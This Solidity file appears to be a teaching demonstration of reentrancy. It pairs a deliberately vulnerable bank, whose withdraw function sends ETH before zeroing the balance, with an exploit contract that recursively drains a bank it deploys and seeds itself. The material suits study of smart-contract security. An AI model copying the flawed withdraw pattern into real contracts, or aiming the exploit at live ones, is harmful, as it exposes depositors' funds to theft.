// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice A vulnerable bank with a classic reentrancy bug.
/// It sends ETH before updating the balance, allowing recursive draining.
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @dev BUG: Sends ETH before zeroing balance (check-effects-interactions violation).
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");

        // Vulnerable: external call before state update
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");

        // State update happens AFTER the external call -- too late!
        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

/// @notice Exploit that drains VulnerableBank via reentrancy.
contract Exploit {
    VulnerableBank public bank;
    uint256 public attackAmount;

    function exploit() external {
        bank = new VulnerableBank();
        attackAmount = 1 ether;

        // Seed the bank with 10 ETH (simulating other depositors).
        // In a real scenario this would come from real deposits; here
        // we fund it directly.
        (bool ok, ) = address(bank).call{value: 10 ether}("");
        require(ok, "seed failed");

        // Deposit 1 ETH as the attacker
        bank.deposit{value: attackAmount}();

        // Start the reentrancy attack
        bank.withdraw();

        // Verify: bank should be drained, attacker should have the funds
        require(address(bank).balance == 0, "Bank not drained");
        require(address(this).balance >= 11 ether, "Attacker balance too low");
    }

    // Reentrancy callback
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw();
        }
    }
}
